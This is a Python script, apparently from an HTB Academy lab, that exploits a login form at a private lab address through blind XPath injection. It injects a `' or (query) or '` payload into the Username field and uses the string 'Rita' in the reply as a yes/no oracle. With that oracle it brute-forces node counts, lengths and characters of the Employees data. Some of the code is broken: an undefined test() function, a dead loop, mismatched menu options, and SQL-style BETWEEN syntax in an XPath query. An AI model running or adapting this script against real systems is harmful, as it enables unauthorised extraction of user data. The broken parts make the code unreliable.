#!/usr/bin/python3
import json,sys,requests, time
from urllib.parse import quote_plus
from tabulate import tabulate


proxies = {
    "http": "http://10.10.10.200:3128"
}

def oracle(query):
    payload = (f"' or ({query}) or '")
    print(payload)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "Username": payload,
        "Password": "test"
    }
    r = requests.post(f"http://172.31.179.1/intranet.php", headers=headers, data=data, proxies=proxies)
    #print(r.text)
    return 'Rita' in r.text

'''
# confirm oracle can run
assert oracle("name(/*[1])")
assert not oracle("name(/*[2])")
'''

# Calculate the Length or Count
def dumpNumber(query):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"({query}) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

# Dumping string
def dumpString(query, length):
    val = ""
    chars = "aeioutrnsldcmphbgfywkvjxzqAEIOUTRNSLDCMPHBGFYWKVJXZQ0123456789"
    for i in range(1, length+1):
        for c in chars:
            if oracle(f"substring({query},{i},1)='{c}'"):
                val += c
                print(val)
    return val


func = int(input("""HTB_ACADEMY_ORACLE
(1) Dump All Datas
(5) Custom Search (Count or Length)
(6) Custom Search (Name)
Your Option : """))

if func == 0:
    test()

elif func == 1:
    
    # calc the first node
    count = 1
    length = 9
    x = "name(/*[1])"
    while 0:
        if oracle(f"string-length(name(/*[1]))={length}"):
            break
        length += 1
    #node_name = dumpString(f"name(/*[1])")

    while 1:
        if oracle(f"count(/Employees/*)={count}"):
            break
        count += 1
    print(count)

